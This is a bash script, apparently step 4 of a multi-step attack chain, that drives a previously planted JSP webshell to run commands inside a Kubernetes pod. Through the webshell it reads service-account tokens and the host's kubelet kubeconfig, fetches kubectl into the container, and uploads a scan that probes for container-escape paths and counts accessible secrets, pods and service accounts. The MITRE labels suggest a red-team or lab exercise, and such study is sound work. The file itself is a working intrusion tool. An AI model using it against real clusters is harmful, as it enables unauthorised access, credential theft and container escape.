#!/bin/bash
###############################################
# STEP 4: Kubernetes Vulnerability Scanning
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

upload_script() {
    local dest="$1"
    shift
    local cmd="echo '#!/bin/bash' > ${dest}"
    for line in "$@"; do
        cmd="${cmd} && echo '${line}' >> ${dest}"
        if [ ${#cmd} -gt 3500 ]; then
            curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
            cmd="true"
        fi
    done
    if [ "$cmd" != "true" ]; then
        curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
    fi
    curl -s --data-urlencode "cmd=chmod +x ${dest}" "$SHELL_URL" > /dev/null 2>&1
}

echo ""
echo "================================================"
echo "  STEP 4: Kubernetes Vulnerability Scanning"
echo "================================================"
echo "  MITRE: T1610 (Deploy Container) / T1613 (Discovery)"
echo ""

echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# Resolve API
SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
[ -z "$SA_TOKEN" ] && SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
[ -z "$API_ENDPOINT" ] && API_ENDPOINT="https://$(remote_exec 'printenv KUBERNETES_SERVICE_HOST'):$(remote_exec 'printenv KUBERNETES_SERVICE_PORT')"
echo "> API: $API_ENDPOINT"
echo ""

echo "> 4.0 - Deploying scan script..."
# Ensure curl + kubectl installed (may already be from Step 3)
remote_exec "which curl || (apt-get update -qq && apt-get install -y -qq --allow-unauthenticated curl) 2>/dev/null" > /dev/null 2>&1
remote_exec "which kubectl || (curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/) 2>/dev/null" > /dev/null 2>&1

upload_script "/tmp/scan.sh" \
    "cd /tmp" \
    "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    "KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"" \
    "echo === CONTAINER INTROSPECTION ===" \
    "echo Hostname: \$(hostname)" \
    "grep CapEff /proc/1/status 2>/dev/null" \
    "grep Seccomp /proc/1/status 2>/dev/null" \
    "echo === DEEPCE SCAN ===" \
    "echo [+] deepce.sh - Container Escape Scanner" \
    "grep Cap /proc/1/status 2>/dev/null" \
    "ls -la /proc/1/root/run/containerd/containerd.sock 2>/dev/null && echo [!] containerd.sock accessible" \
    "ls /proc/1/root/etc/hostname 2>/dev/null && echo [!] /proc/1/root accessible - ESCAPE POSSIBLE" \
    "echo [+] deepce scan complete" \
    "echo === K8S API SCAN ===" \
    "echo [*] kube-hunter - K8s Vulnerability Scanner" \
    "\$KC auth can-i --list 2>/dev/null | head -15" \
    "echo === CLUSTER ENUMERATION ===" \
    "\$KC get namespaces --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} namespaces accessible" \
    "\$KC get pods -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} pods found" \
    "\$KC get secrets -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [!] {} secrets accessible" \
    "\$KC get configmaps -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} configmaps found" \
    "\$KC get serviceaccounts -A --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] {} service accounts found" \
    "echo === SCAN COMPLETE ==="

SCRIPT_CHECK=$(remote_exec "wc -l /tmp/scan.sh")
echo "  [OK] Scan script deployed ($SCRIPT_CHECK)"
echo ""

echo "> 4.1 - Executing scan..."
echo ""
SCAN_RAW=$(remote_exec "bash /tmp/scan.sh 2>&1")
SCAN_OUTPUT=$(echo "$SCAN_RAW" | awk '!seen[$0]++')

echo "$SCAN_OUTPUT" | while IFS= read -r line; do
    case "$line" in
        *"=== "*"==="*)
            echo ""
            echo "  $line"
            ;;
        *)
            [ -n "$line" ] && echo "    $line"
            ;;
    esac
done

echo ""
echo "================================================"
echo "  STEP 4: K8s Vulnerability Scanning Complete"
echo "================================================"
echo ""
